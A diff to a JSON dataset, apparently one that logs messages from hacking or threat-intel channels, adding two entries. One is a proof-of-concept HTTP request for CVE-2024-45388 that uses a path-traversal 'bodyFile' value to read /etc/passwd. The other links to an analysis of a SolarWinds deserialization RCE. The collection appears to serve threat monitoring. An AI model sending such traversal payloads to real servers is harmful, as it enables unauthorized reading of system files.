@@ -8442,6 +8442,28 @@
             "URLs": [
                 "https://linkdebhai.in"
             ]
+        },
+        {
+            "Message ID": 1943,
+            "Date": "2024-09-09",
+            "Content": "CVE-2024-45388\n\nPUT /api/v2/simulation HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\n \n{\"data\":{\"pairs\":[{\"request\":{},\"response\":{\"bodyFile\": \"../../../../../../../etc/passwd\",\"x\":\"aaa\"}} ]},\"meta\":{\"schemaVersion\":\"v5.3\"}}\n\n../../../../../../../etc/passwd\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "meta\":{\"schemaVersion\":\"v5.3"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 1942,
+            "Date": "2024-09-09",
+            "Content": "https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/\n\nSolarWinds Security Event Manager AMF 反序列化 RCE (CVE-2024-0692)\n#分析",
+            "Attack Type": "Hacking",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/"
+            ]
         }
     ],
     "Anonymous Chat": [
